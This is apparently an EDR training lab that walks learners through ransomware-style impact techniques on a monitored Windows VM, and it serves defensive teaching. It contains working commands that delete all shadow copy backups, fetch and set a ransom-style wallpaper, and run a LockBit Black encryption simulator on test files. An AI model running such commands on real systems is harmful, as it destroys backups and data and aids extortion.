---
Title: ATT&CK - Impact Phase
Description: Introduce post-compromise attack behaviors and EDR defenses
Author: Chris Gerritz, Datto
Created: 04/17/2025
Achievements:
Duration: 10
Range:
- Windows
Applications:
- Terminal (Command prompt)
- PowerShell
- Datto EDR
- SysInternals
- LibreOffice
- Gimp
- Ransomware Simulation Binary
External:
- attack.mitre.org
- allitshop.infocyte.com
- infocyte-support.s3.us-east-2.amazonaws.com/extension-utilities/wallpaper.jpg
---

## Description

The purpose of these labs is to introduce post-compromise attack behaviors and EDR defenses. We will perform post-compromise behaviors that an attacker would run once they compromised a system within the network.  This system has Datto EDR installed for monitoring so we will be able to view these commands from the defender's perspective as well.

The Impact phase of an attack consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. 

In order for a ransom to be effective, skilled attackers often wait till they have total control of a network and pre-stage their ransomware on every system so that it can be initiated all at once on every system with security tooling and backup software disabled.


## Objectives
<!--
- List all objectives for this lab
- Need at least three objectives
- Use blooms taxonomy verbs 
-->
1. Understand the Impact phase of an attack
2. Demonstrate some system changes common during this phase
   

## Requirements

|                  |                             |
|------------------|-----------------------------|
| **Range**        | Windows |
| **Applications** | All applications needed     |
| **Needed Files** | None |



## Instructions

Open a new terminal using `c:\Users\Public\rat.exe` or you can use the same terminal from the previous lab. You will be copying and pasting the lab commands into this terminal session.  If you close this window, remember to re-open `c:\Users\Public\rat.exe` before running any of the labs.

w> All labs require you to be running as an administrator. 


### 1. Inhibit System Recovery
> *Ransomware's purpose is to restrict access to data by encrypting it till the victim pays the ransom. Inhibiting the ability to restore from backup is essential to making sure the attacker achieves this objective.*
>
> *The method we'll demonstrate today is common in all ransomware attacks: deleting the shadowcopy backups.  The shadowcopy, when enabled, stores copies of any files modified and is the basis for some ransomware rollback software.*

Delete the shadow copy backups to perform **Inhibit System Recovery** technique
- MITRE ATT&CK Technique: [ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)
- Copy and paste this command into the terminal:
	```PowerShell
	# Shadow Copy Deletion
	Write-Host -ForegroundColor Cyan "Initiating technique T1490 - Inhibit System Recovery"
	vssadmin.exe delete shadows /All /quiet 2>&1
	```

### 2. Wallpaper Defacement
> *An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. In ransomware, the wallpaper will be changed to give the user instructions and make their demands*

Execute a **Wallpaper Defacement** by changing the background to a ransomware message. 
- MITRE ATT&CK Technique: [ATT&CK T1491 - Impact - Defacement: Internal Defacement](https://attack.mitre.org/techniques/T1491)
- Copy and paste this command into the terminal:
```PowerShell
(Get-ItemProperty 'HKCU:\Control Panel\Desktop').WallPaper | Set-Content "$env:TEMP\original_wallpaper.txt"

powershell -NoProfile -NoLogo -ExecutionPolicy Bypass -Command {
    Write-Host -ForegroundColor Cyan "Initiating technique T1491 - Defacement: Internal Defacement";
    Start-Sleep -Seconds 2;

    $wallpaperURL = "https://infocyte-support.s3.us-east-2.amazonaws.com/extension-utilities/wallpaper.jpg";
    $wallpaperPath = "$env:temp\wallpaper.jpg";

    Invoke-WebRequest $wallpaperURL -OutFile $wallpaperPath;
    Start-Sleep -Milliseconds 1000;

    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value 10;
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value 0;

    Add-Type -TypeDefinition @'
        using System;
        using System.Runtime.InteropServices;
        public class Params {
            [DllImport("user32.dll", CharSet = CharSet.Unicode)]
            public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
'@;

    $UpdateIniFile = 0x01;
    $SendChangeEvent = 0x02;
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent;

    [Params]::SystemParametersInfo(0x0014, 0, $wallpaperPath, $fWinIni);
}
```
- [Optional] Restore:
```Powershell
powershell -NoProfile -NoLogo -ExecutionPolicy Bypass -Command {
    $oldPath = Get-Content "$env:TEMP\original_wallpaper.txt"
    Write-Host -ForegroundColor Cyan "Restoring original wallpaper...";
    Start-Sleep -Seconds 2;

    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value 10;
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value 0;

    Add-Type -TypeDefinition @'
        using System;
        using System.Runtime.InteropServices;
        public class Params {
            [DllImport("user32.dll", CharSet = CharSet.Unicode)]
            public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
'@;

    $UpdateIniFile = 0x01;
    $SendChangeEvent = 0x02;
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent;

    [Params]::SystemParametersInfo(0x0014, 0, $oldPath, $fWinIni);
    Write-Host -ForegroundColor Green "Wallpaper restored to: $oldPath";
}
```
---

### 3. Ransomware Simulation – LockBit Black (Advanced / Optional)

> **⚠️ EXTREME CAUTION**
> 
> * Running the following PowerShell command will **intentionally encrypt files and isolate your system to simulate real ransomware behavior**.  
> * **Only execute it in an isolated lab VM or disposable snapshot** where you have **verified rollback or re-image capability**.  
> * Datto EDR will quarantine or network-isolate the host; you must have privileges (and a plan) to release or restore the endpoint afterward.  
> * **Do _not_ run this on production systems or any machine containing data you cannot lose.**

**Goal** Demonstrate the *Data Encrypted for Impact* technique using the open-source **RWSim** utility emulating LockBit Black ransomware.

* MITRE ATT&CK Technique: [T1486 – Impact – Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486)

#### Steps

1. **Prepare**  
   * Download **`TestRWSimSelfContained.zip`** (provided separately) to the Desktop of your lab VM.
   * If it is not on your desktop or you are using your own VM, you can download the ransomware simulator here:
	https://traininglab-files.s3.us-west-1.amazonaws.com/TestRWSimSelfContained.zip
   * Ensure you are running the terminal **as Administrator**.

2. **Execute** – copy-and-paste the entire one-liner below:

    ```PowerShell
    powershell.exe -NoProfile -NoLogo -ExecutionPolicy Bypass -Command {
        #############################################################################
        ## RWSim Inline Demo – LockBit Black encryption
        ## Author: Chris Gerritz – Datto – ©2025
        #############################################################################

        $ErrorActionPreference = 'Stop'        

        $ZipName   = 'TestRWSimSelfContained.zip'
        $HomeRoot  = [Environment]::GetFolderPath('UserProfile')
        $ExtractTo = Join-Path $HomeRoot 'TestRWSimSelfContained'
        $DestRoot  = 'C:\RWSimDemo'

        Write-Host @'
     _______________________________________________________________
    |                                                               |
    |   R W S i m   L o c k B i t   B l a c k   D e m o             |
    |_______________________________________________________________|
    '@ -ForegroundColor Yellow

        try {
            Write-Host "[1/5] Locating archive on Desktop..." -ForegroundColor Cyan
            $zip = Join-Path ([Environment]::GetFolderPath('Desktop')) $ZipName
            if (-not (Test-Path $zip)) { throw "ZIP not found: $zip" }

            Write-Host "[2/5] Extracting to $ExtractTo ..." -ForegroundColor Cyan
            Remove-Item $ExtractTo -Recurse -Force -ErrorAction SilentlyContinue
            Expand-Archive -Path $zip -DestinationPath $ExtractTo -Force

            Write-Host "[3/5] Scanning for RWSim.exe ..." -ForegroundColor Cyan
            $ExePath = Get-ChildItem -Path $ExtractTo -Filter 'RWSim.exe' -Recurse |
                       Select-Object -First 1 -ExpandProperty FullName
            if (-not $ExePath) { throw "RWSim.exe not found under $ExtractTo" }

            $SrcRoot = Split-Path $ExePath -Parent
            $DataSrc = Join-Path $SrcRoot 'testdata'
            $NoteSrc = Join-Path $SrcRoot 'rnote.txt'
            foreach ($p in @($DataSrc,$NoteSrc)) {
                if (-not (Test-Path $p)) { throw "Required item missing: $p" }
            }

            Write-Host "[4/5] Copying artefacts to $DestRoot ..." -ForegroundColor Cyan
            New-Item -ItemType Directory -Path $DestRoot -Force -ErrorAction SilentlyContinue | Out-Null
            Copy-Item -Path $DataSrc -Destination $DestRoot -Recurse -Force -ErrorAction SilentlyContinue
            Copy-Item -Path $NoteSrc -Destination $DestRoot -Force -ErrorAction SilentlyContinue

            Write-Host "[5/5] Executing RWSim – LockBit Black profile..." -ForegroundColor Cyan
            Push-Location $DestRoot
            & $ExePath -encrypt -datafolder (Join-Path $DestRoot 'testdata') -rwtype lockbitblack 2>$null
            $exit = $LASTEXITCODE
            Pop-Location

            if ($exit -eq 0) {
                Write-Host "`Demo complete!  Encrypted files → $DestRoot\testdata" -ForegroundColor Green
            } else {
                Write-Host "`RWSim finished with exit code $exit." -ForegroundColor Yellow
            }

            Write-Host "`n(To remove the extracted folder later: Remove-Item '$ExtractTo' -Recurse -Force)" `
                       -ForegroundColor DarkGray
        }
        catch {
            Write-Host "`n$($_.Exception.Message)" -ForegroundColor Red
        }
    }
    ```

3. **Cleanup / Revert**  
   * Release isolation (or restore snapshot) via your EDR console.  
   * Delete `C:\RWSimDemo` and `TestRWSimSelfContained` if you do not need the evidence.

---
